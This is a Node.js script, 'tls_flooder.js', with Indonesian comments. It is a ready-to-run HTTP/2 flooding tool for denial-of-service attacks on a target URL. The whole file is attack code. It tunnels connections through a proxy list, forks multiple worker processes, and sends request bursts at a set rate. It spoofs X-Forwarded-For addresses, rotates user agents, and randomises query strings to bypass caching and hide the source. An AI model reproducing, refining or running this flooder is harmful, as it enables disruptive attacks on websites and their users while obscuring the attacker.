// tls_flooder.js

const cluster = require("cluster");
const fs      = require("fs");
const net     = require("net");
const tls     = require("tls");
const http2   = require("http2");
const url     = require("url");
const crypto  = require("crypto");

if (process.argv.length < 6) {
  console.error("Usage: node tls_flooder.js URL DURATION SEC_RATE THREADS");
  process.exit(1);
}

const [targetUrl, durationSec, rate, threads] = process.argv.slice(2).map((v, i) => 
  i === 0 ? v : Number(v)
);

const parsed = url.parse(targetUrl);
const proxies = fs.readFileSync("proxy.txt", "utf-8").trim().split(/\r?\n/);
const uagents = fs.readFileSync("ua.txt",    "utf-8").trim().split(/\r?\n/);

// Reuse satu SecureContext untuk semua connections
const secureContext = tls.createSecureContext({
  honorCipherOrder: true,
  secureOptions: crypto.constants.SSL_OP_NO_SSLv2
               | crypto.constants.SSL_OP_NO_SSLv3
               | crypto.constants.SSL_OP_NO_TLSv1
               | crypto.constants.SSL_OP_NO_TLSv1_1
               | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT
               | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE
               | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
               | crypto.constants.SSL_OP_SINGLE_DH_USE
               | crypto.constants.SSL_OP_SINGLE_ECDH_USE,
  ciphers:     crypto.constants.defaultCoreCipherList,
  sigalgs:     "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
  ecdhCurve:   "x25519:secp256r1:secp384r1",
  secureProtocol: "TLS_client_method"
});

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomIP() {
  return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`;
}

function randomItem(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

// Single CONNECT-through-proxy wrapper
function connectViaProxy(proxy, cb) {
  const [host, port] = proxy.split(":");
  const socket = net.connect({ host, port: +port });
  const req    = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}\r\nConnection: keep-alive\r\n\r\n`;

  socket.setTimeout(5000);
  socket.once("connect", () => socket.write(req));
  socket.once("data", chunk => {
    if (chunk.includes("200")) cb(null, socket);
    else            cb(new Error("proxy rejected"), socket);
  });
  socket.once("error",    err => cb(err, socket));
  socket.once("timeout",  () => cb(new Error("proxy timeout"), socket));
}

// Fungsi inti flooding
async function floodWorker() {
  const endTime = Date.now() + durationSec * 1000;

  while (Date.now() < endTime) {
    const bursts = Array.from({ length: rate }, async () => {
      const proxy = randomItem(proxies);
      connectViaProxy(proxy, (err, rawSocket) => {
        if (err || !rawSocket) return rawSocket?.destroy();

        const tlsSock = tls.connect({
          socket: rawSocket,
          servername: parsed.host,
          secureContext,
          ALPNProtocols: ["h2"],
          rejectUnauthorized: false
        });

        tlsSock.setKeepAlive(true);
        tlsSock.setNoDelay(true);

        const client = http2.connect(targetUrl, {
          createConnection: () => tlsSock,
          settings: { enablePush: false, initialWindowSize: 1 << 22 }
        });

        client.on("connect", () => {
          // Kirim 2 request per koneksi
          for (let i = 0; i < 2; i++) {
            const req = client.request({
              ":method": "GET",
              ":path":  `${parsed.path}?r=${Math.random().toString(36).slice(2)}`,
              ":scheme": "https",
              ":authority": parsed.host,
              "user-agent": randomItem(uagents),
              "x-forwarded-for": randomIP(),
              "accept": "text/html,application/xhtml+xml",
              "cache-control": "no-cache",
              "referer": targetUrl
            });
            req.on("response", () => req.close());
            req.end();
          }
        });

        client.once("error", () => client.destroy());
        client.once("close", () => client.destroy());
      });
    });

    // Tunggu batch selesai atau timeout 1 detik
    await Promise.race([
      Promise.allSettled(bursts),
      new Promise(r => setTimeout(r, 1000))
    ]);
  }

  process.exit(0);
}

// Setup multi‐process dengan cluster
if (cluster.isMaster) {
  for (let i = 0; i < threads; i++) cluster.fork();
  cluster.on("exit", () => process.exit(0));

} else {
  floodWorker().catch(() => process.exit(1));
}
